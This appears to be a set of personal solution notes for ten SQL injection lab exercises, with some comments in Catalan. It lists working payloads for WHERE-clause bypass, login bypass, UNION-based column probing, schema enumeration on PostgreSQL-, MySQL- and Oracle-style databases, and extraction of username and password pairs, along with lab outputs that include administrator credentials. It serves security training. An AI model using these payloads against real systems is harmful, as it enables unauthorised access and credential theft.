## **Lab 1**: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

    /filter?category=Gifts' or 1=1-- -'

## **Lab 2**: SQL injection vulnerability allowing login bypass

    administrator'-- -

## **Lab 3**: SQL injection UNION attack, determining the number of columns returned by the query

    filter?category=Gifts' union select NULL, NULL, NULL-- -
## **Lab 4**: SQL injection UNION attack, finding a column containing text

    filter?category=Gifts' union select NULL,'1M2wiY',NULL-- -

## **Lab 5**: SQL injection UNION attack, retrieving data from other tables
1. Llistar TOTES les Bases de Dades:
        
        filter?category=Gifts' union select schema_name,NULL from information_schema.schemata-- -
2. Llistar TOTES les Taules de totes les BBDD:
        
        filter?category=Gifts' union select table_name,NULL from information_schema.tables-- -
3. Llistar TOTES les Taules d'1 BDD:
        
        filter?category=Gifts' union select table_name,NULL from information_schema.tables where table_schema='public'-- -
4. Llistar TOTES les Columnes d'una taula i una BDD en concret:
        
        filter?category=Gifts' union select column_name,NULL from information_schema.columns where table_schema='public' and table_name='users'-- -
5. Llistar Dades de diferents maneres
       
        a) filter?category=Gifts' union select NULL,group_concat(username,':',password) from users-- -
        b) filter?category=Gifts' union select NULL,group_concat(username,0x3a,password) from users-- -
            ---> Convertim els : en Hexadecimal
        c) filter?category=Gifts' union select NULL,group_concat(username,':',password) from users where username = 'admin'-- -
        d) filter?category=Gifts' union select NULL,group_concat(username,':',password) from users where username = '0x61646d696e'-- -
            ---> Convertim la paraula 'admin' en Hexadecimal

        Convertir 'admin' en Hexadecimal ==> echo "admin" | tr -d '\n' | xxd -ps

        5.1. SOLVED: filter?category=Gifts' union select username,password from users-- -
        5.2. SOLVED: filter?category=Gifts' union select NULL,username||':'||password from users-- -
              - OUTPUT: administrator:ria9b2ri5pwga9fk2s41

## **Lab 6**: SQL injection UNION attack, retrieving multiple values in a single column

    filter?category=Gifts' union select NULL,username||':'||password from users-- -
            OUTPUT: administrator/lt7elzdb9kleb4bdfy9f

## **Lab 7**: SQL injection attack, querying the database type and version on Oracle
    filter?category=Gifts' union select NULL,banner from v$version-- -

## **Lab 8**: SQL injection attack, querying the database type and version on MySQL and Microsoft
    filter?category=Lifestyle' union select NULL,@@version-- -

## **Lab 9**: SQL injection attack, listing the database contents on non-Oracle databases
    a) filter?category=Accessories' union select NULL,table_name from information_schema.tables where table_schema='public'-- -
	    OUTPUT: users_mozxmt, products
    b) filter?category=Accessories' union select column_name,NULL from information_schema.columns where table_schema='public' and table_name='users_mozxmt'-- -
	    OUTPUT: password_imfrmo, username_blbbus
    c) filter?category=Accessories' union select username_blbbus,password_imfrmo from users_mozxmt-- -
	        OUTPUT: administrator/4osd4u3aeqkfxw5z3zvk

## **Lab 10**: SQL injection attack, listing the database contents on Oracle

    a) filter?category=Gifts' union select NULL,owner from all_tables-- -
	    OUTPUT: APEX_040000, CTXSYS, MDSYS, PETER, SYS, SYSTEM, XDB
    b) filter?category=Gifts' union select NULL,table_name from all_tables where owner = 'PETER'-- -
	    OUTPUT: products, USERS_IFEEJB
    c) filter?category=Gifts' union select NULL,column_name from all_tab_columns where table_name = 'USERS_IFEEJB'-- -
	    OUTPUT: PASSWORD_HHELXQ, USERNAME_QLKZDD
    d) filter?category=Gifts' union select NULL,USERNAME_QLKZDD||':'||PASSWORD_HHELXQ from USERS_IFEEJB-- -
	    OUTPUT: administrator/l5j55i07t8chg0l6j2jd